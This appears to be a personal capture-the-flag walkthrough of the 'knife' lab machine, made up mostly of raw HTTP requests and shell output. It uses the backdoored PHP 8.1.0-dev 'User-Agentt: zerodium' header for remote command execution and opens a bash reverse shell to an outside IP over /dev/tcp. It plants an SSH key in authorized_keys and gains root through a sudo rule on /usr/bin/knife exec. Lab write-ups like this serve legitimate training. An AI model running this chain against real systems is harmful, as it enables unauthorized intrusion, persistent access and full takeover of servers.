There's a Header injection

Send:

```
GET / HTTP/1.1
Host: 10.129.137.10
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
User-Agentt: zerodiumvar_dump(2*3)
Cache-Control: max-age=0

```

Recieve:

```
HTTP/1.1 404 Not Found
Date: Mon, 24 May 2021 10:35:50 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 25

No input file specified.
```

`User-Agentt: zerodiumsystem('ls');` 
We can execute commands between the brackets

`User-Agentt: zerodiumsystem('id');`
uid=1000(james) gid=1000(james) groups=1000(james)

Our first [[Flag]]

`User-Agentt: zerodiumsystem('sudo -l');`
```Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

`User-Agentt: zerodiumsystem('sudo /usr/bin/knife exec');`
```

An interactive shell is opened

Type your script and do:

1. To run the script, use 'Ctrl D'
2. To exit, use 'Ctrl/Shift C'

Type here a script...
```

https://superuser.com/questions/585398/sending-simulated-keystrokes-in-bash

Reverse Shell:

```
User-Agentt: zerodiumsystem('/bin/bash -c "bash -i >& /dev/tcp/10.10.17.19/5555 0>&1"');
```

```
james@knife:/usr/bin$ cd ~
cd ~
james@knife:~$ ls
ls
user.txt
james@knife:~$ echo "system('/bin/bash')" > privesc.rb
echo "system('/bin/bash')" > privesc.rb
james@knife:~$ ls
ls
privesc.rb
user.txt
james@knife:~$ chmod +x privesc.rb
chmod +x privesc.rb
james@knife:~$ sudo /usr/bin/knife exec privesc.rb
sudo /usr/bin/knife exec privesc.rb
```

heck let's ssh into it instead. Upload your id_rsa and echo it into james' id then connect

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8ShQhpH88Fr7/FPyoasDpT1YMtiQYsMyrhuJwqFv6q2Hm2bDlxcxrRsDXxgJY8HDE9Ay1ZVsb2ty6fVQxTcQ57DodQO5dtNJ2KJknKkhgT8Et7Y0wZWka5SVFvIsH6Hdl+fupWSSg4S7X82K1oOjeO0gDlLOCTzj6Xki+ELu90wFjn2cw9viPms6mGg2TNX4ZBVf86y52AgSP1q/ICTFsBORenWfLkYNNopLnTKyP6DaGUGo5JxYkT47c5xoxRFT+ORp+MA4aAmle2GLEMSuxtmZhTtgpzun3BF8K7Pq3kaeSh2Os526CocleIJ0qSaJtXmAVbNRgVymheEX0kB2jETqyjz+4QAnPCtQsaHTEYYHujx/tmgxWuyoiC/7CpGFBvsJLharh3nT3W76rqc5VuobhgdZ0kuiiKqR8hguXlFpSl/9uPrdKXRmJUeaN1R3g8TgaVTIDxbR0MggS+d1bZubzrj8pd/F4ENnlw0V9xoguicVWGXy2SFMEZPw9OKs= kali@kali" > authorized_keys
```

`<guicVWGXy2SFMEZPw9OKs= kali@kali" > authorized_keys`

```
james@knife:~$ ls
user.txt
james@knife:~$ echo "system('/bin/bash')" > privesc.rb
james@knife:~$ ls
privesc.rb  user.txt
james@knife:~$ chmod +x privesc.rb 
james@knife:~$ sudo /usr/bin/knife exec privesc.rb
root@knife:/home/james# 
```

```
root@knife:/# cd /root
root@knife:~# cat root.txt
2ffab1d0c49e56dd1f77f0b1b8a44b9f
```
And our last [[Flag]] :)

[[etc-shadow]]